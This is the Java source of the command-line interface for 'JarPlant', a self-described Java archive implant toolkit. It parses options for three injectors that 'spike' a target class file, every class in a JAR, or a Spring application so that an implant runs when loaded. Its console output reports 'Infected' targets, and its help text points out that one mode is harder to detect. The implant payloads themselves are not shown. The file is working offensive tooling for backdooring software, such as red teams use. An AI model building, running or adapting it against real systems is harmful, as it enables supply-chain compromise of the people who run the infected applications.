package org.example;

import net.sourceforge.argparse4j.ArgumentParsers;
import net.sourceforge.argparse4j.impl.Arguments;
import net.sourceforge.argparse4j.inf.*;
import org.example.implants.ClassImplant;
import org.example.implants.MethodImplant;
import org.example.implants.SpringImplantConfiguration;
import org.example.implants.SpringImplantController;
import org.example.injector.ClassInjector;
import org.example.injector.ImplantHandler;
import org.example.injector.MethodInjector;
import org.example.injector.SpringInjector;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Map;

public class Cli {
    // Credz: 'Square' font by Chris Gill, 30-JUN-94 -- based on .sig of Jeb Hagan.
    private final static String banner =
            "       _____               ______  __                __   \n" +
                    "     _|     |.---.-..----.|   __ \\|  |.---.-..-----.|  |_ \n" +
                    "    |       ||  _  ||   _||    __/|  ||  _  ||     ||   _|\n" +
                    "    |_______||___._||__|  |___|   |__||___._||__|__||____|\n" +
                    "    Java archive implant toolkit   v0.1   by w1th4d & kugg";

    private final static String examples = "for more options, see command help pages:\n" +
            "  $ java -jar jarplant.jar method-injector -h\n" +
            "  $ java -jar jarplant.jar class-injector -h\n" +
            "  $ java -jar jarplant.jar spring-injector -h\n\n" +
            "example usage:\n" +
            "  $ java -jar jarplant.jar class-injector \\\n" +
            "    --target path/to/target.jar --output spiked-target.jar";

    enum Command {
        METHOD_INJECTOR, CLASS_INJECTOR, SPRING_INJECTOR
    }

    public static void main(String[] args) {
        ArgumentParser parser = ArgumentParsers.newFor("java -jar jarplant.jar").build()
                .defaultHelp(true)
                .description(banner)
                .epilog(examples);
        Subparsers subparsers = parser.addSubparsers()
                .metavar("command");

        Subparser methodInjectorParser = subparsers.addParser("method-injector")
                .help("Copy a simple static method into the target. This injector only operates on a class (not a JAR). The target class will be modified to run the implanted method when loaded. This injector offers only a limited set of features but can be more difficult to detect.")
                .description(banner)
                .setDefault("command", Command.METHOD_INJECTOR);
        methodInjectorParser.addArgument("--target", "-t")
                .help("Path to the class file to spike.")
                .metavar("CLASS-FILE")
                .type(Arguments.fileType().acceptSystemIn().verifyExists().verifyCanRead())
                .required(true);
        methodInjectorParser.addArgument("--output", "-o")
                .help("Path to where the spiked class will be written. This could be the same file as the target.")
                .metavar("CLASS-FILE")
                .type(Arguments.fileType().verifyCanCreate())
                .required(true);
        methodInjectorParser.addArgument("--implant-class")
                .help("Name of the class holding the method implant.")
                .choices("MethodImplant")
                .setDefault("MethodImplant");
        methodInjectorParser.addArgument("--implant-method")
                .help("The name of the method to copy into the target.")
                .metavar("METHOD-NAME")
                .type(String.class)
                .setDefault("init");

        Subparser classInjectorParser = subparsers.addParser("class-injector")
                .help("Inject a class implant into a JAR containing regular classes. This will modify *all* classes in the JAR to call the implant's 'init()' method when loaded.")
                .description(banner)
                .setDefault("command", Command.CLASS_INJECTOR);
        classInjectorParser.addArgument("--target", "-t")
                .help("Path to the JAR file to spike.")
                .metavar("JAR")
                .type(Arguments.fileType().acceptSystemIn().verifyExists().verifyCanRead())
                .required(true);
        classInjectorParser.addArgument("--output", "-o")
                .help("Path to where the spiked JAR will be written. Should not be the same file as the target.")
                .metavar("JAR")
                .type(Arguments.fileType().verifyCanCreate())
                .required(true);
        classInjectorParser.addArgument("--implant-class")
                .help("Name of the class containing a custom 'init()' method and other implant logic.")
                .choices("ClassImplant")
                .setDefault("ClassImplant");

        Subparser springInjectorParser = subparsers.addParser("spring-injector")
                .help("Inject a Spring component into a JAR-packaged Spring application. The component will be loaded and included in the Spring context.")
                .description(banner)
                .setDefault("command", Command.SPRING_INJECTOR);
        springInjectorParser.addArgument("--target", "-t")
                .help("Path to the JAR file to spike.")
                .metavar("JAR")
                .type(Arguments.fileType().acceptSystemIn().verifyExists().verifyCanRead())
                .required(true);
        springInjectorParser.addArgument("--output", "-o")
                .help("Path to where the spiked JAR will be written. Should not be the same file as the target.")
                .metavar("JAR")
                .type(Arguments.fileType().verifyCanCreate())
                .required(true);
        springInjectorParser.addArgument("--implant-component")
                .help("Name of the Spring component to inject into the class. This will typically be a '@RestController' class.")
                .choices("SpringImplantController")
                .setDefault("SpringImplantController");
        springInjectorParser.addArgument("--implant-config")
                .help("Name of the Spring configuration class to use as a template in case the target Spring config needs to be modified. Only the '@Bean' annotated methods in this class will be copied to the target config.")
                .choices("SpringImplantConfiguration")
                .setDefault("SpringImplantConfiguration");

        Namespace namespace;
        try {
            namespace = parser.parseArgs(args);
        } catch (ArgumentParserException e) {
            parser.handleError(e);
            System.exit(1);
            throw new RuntimeException("Unreachable");
        }

        Path targetPath = Path.of(namespace.getString("target"));
        Path outputPath = Path.of(namespace.getString("output"));

        Command command = namespace.get("command");
        switch (command) {
            case METHOD_INJECTOR -> {
                String implantClassName = namespace.getString("implant_class");
                String implantMethodName = namespace.getString("implant_method");
                if (implantClassName.equals("MethodImplant")) {
                    runMethodInjector(targetPath, outputPath, MethodImplant.class, implantMethodName);
                } else {
                    System.out.println("[!] Unknown --implant-class.");
                    System.exit(1);
                }
            }
            case CLASS_INJECTOR -> {
                assertNotSameFile(targetPath, outputPath);

                String implantClassName = namespace.getString("implant_class");
                if (implantClassName.equals("ClassImplant")) {
                    ImplantHandler implantHandler;
                    try {
                        implantHandler = ImplantHandler.findAndCreateFor(ClassImplant.class);
                    } catch (ClassNotFoundException | IOException e) {
                        throw new RuntimeException("Cannot find built-in implant class.", e);
                    }
                    runClassInjector(targetPath, outputPath, implantHandler);
                } else {
                    System.out.println("[!] Unknown --implant-class.");
                    System.exit(1);
                }
            }
            case SPRING_INJECTOR -> {
                assertNotSameFile(targetPath, outputPath);

                String implantComponent = namespace.getString("implant_component");
                String implantConfClass = namespace.getString("implant_config");
                if (implantComponent.equals("SpringImplantController") && implantConfClass.equals("SpringImplantConfiguration")) {
                    ImplantHandler componentHandler;
                    ImplantHandler springConfigHandler;
                    try {
                        componentHandler = ImplantHandler.findAndCreateFor(SpringImplantController.class);
                        springConfigHandler = ImplantHandler.findAndCreateFor(SpringImplantConfiguration.class);
                    } catch (ClassNotFoundException | IOException e) {
                        throw new RuntimeException("Cannot find built-in implant class.", e);
                    }
                    runSpringInjector(targetPath, outputPath, componentHandler, springConfigHandler);
                } else {
                    System.out.println("[!] Unknown --implant-component or --implant-config.");
                    System.exit(1);
                }
            }
            default -> {
                parser.printHelp();
                System.exit(1);
            }
        }
    }

    public static void runMethodInjector(Path targetClassFile, Path outputClassFile, Class<?> sourceClass, String methodName) {
        MethodInjector injector;
        try {
            ImplantHandler implantHandler = ImplantHandler.findAndCreateFor(sourceClass);
            injector = new MethodInjector(implantHandler, methodName);
        } catch (IOException | ClassNotFoundException | UnsupportedOperationException e) {
            System.out.println("[!] MethodInjector failed! Reason: " + e.getMessage());
            System.exit(2);
            throw new RuntimeException("Unreachable");
        }

        System.out.println(banner);
        System.out.println();

        System.out.println("[i] Source class: " + injector.getClass().getName());
        System.out.println("[i] Target class: " + targetClassFile);

        final boolean didInfect;
        try {
            didInfect = injector.infectTarget(targetClassFile, outputClassFile);
        } catch (IOException e) {
            System.out.println("[!] Cannot infect target class file! Error message: " + e.getMessage());
            System.exit(3);
            throw new RuntimeException("Unreachable");
        }

        if (!didInfect) {
            System.out.println("[-] Did not infect target. It looks like it may already be infected?");
        } else {
            System.out.println("[+] Infected target class: " + targetClassFile);
        }
    }

    public static void runClassInjector(Path targetPath, Path outputPath, ImplantHandler implantHandler) {
        ClassInjector injector = new ClassInjector(implantHandler);

        System.out.println(banner);
        System.out.println();

        System.out.println("[i] Implant class: " + implantHandler.getImplantClassName());
        System.out.println("[i] Target JAR: " + targetPath);
        System.out.println("[i] Output JAR: " + outputPath);
        System.out.println();

        System.out.println("[+] Reading implant config...");
        Map<String, Object> config;
        try {
            config = implantHandler.readImplantConfig();
        } catch (IOException e) {
            throw new RuntimeException("Could not load implant.", e);
        }
        for (Map.Entry<String, Object> entry : config.entrySet()) {
            System.out.println("[i] " + entry.getKey() + ": " + entry.getValue());
        }
        System.out.println();

        try {
            boolean didInfect = injector.infect(targetPath, outputPath);

            if (didInfect) {
                System.out.println("[+] Infected '" + targetPath + "'.");
                System.out.println();
                System.out.println("[i] Spiked JAR available at: " + outputPath);
            } else {
                System.out.println("[-] Did not infect '" + targetPath + "'.");
            }
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    public static void runSpringInjector(Path targetPath, Path outputPath, ImplantHandler componentHandler, ImplantHandler springConfigHandler) {
        SpringInjector injector = new SpringInjector(componentHandler, springConfigHandler);

        System.out.println(banner);
        System.out.println();

        System.out.println("[i] Implant Spring component: " + componentHandler.getImplantClassName());
        System.out.println("[i] Implant Spring config class: " + componentHandler.getImplantClassName());
        System.out.println("[i] Target JAR: " + targetPath);
        System.out.println("[i] Output JAR: " + outputPath);
        System.out.println();

        try {
            boolean didInfect = injector.infect(targetPath, outputPath);
            if (didInfect) {
                System.out.println("[+] Infected '" + targetPath + "'. Modified JAR available at: " + outputPath);
                System.out.println();
                System.out.println("[i] Spiked JAR available at: " + outputPath);
            } else {
                System.out.println("[-] Did not infect '" + targetPath + "'.");
            }
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    private static void assertNotSameFile(Path target, Path output) {
        try {
            if (Files.exists(output) && target.toRealPath().equals(output.toRealPath())) {
                System.out.println("[!] Target JAR and output JAR cannot be the same.");
                System.exit(1);
            }
        } catch (IOException e) {
            System.out.println("[!] Cannot read file: " + e.getMessage());
        }
    }
}
